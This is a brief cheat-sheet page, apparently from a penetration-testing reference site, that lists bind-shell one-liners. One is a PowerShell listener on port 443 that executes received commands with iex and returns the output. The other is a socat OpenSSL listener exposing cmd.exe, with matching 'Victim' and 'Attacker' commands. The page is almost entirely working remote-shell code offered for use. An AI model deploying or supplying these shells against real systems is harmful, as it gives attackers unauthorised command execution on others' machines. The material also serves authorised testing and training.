---
layout: page
title: "# Bind Shells"
permalink: /shell/bind_shells/
---

# Bind Shells

## Powershell:

```powershell
#Oneliner:
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
```

## SoCat:

```bash
#Bind Secure:

#Victim:
$socat OPENSSL-LISTEN:8888,cert=shell.pem,verify=0,fork EXEC:'cmd.exe',pipes

#Attacker:
socat - OPENSSL:192.168.73.134:8888,verify=0
```
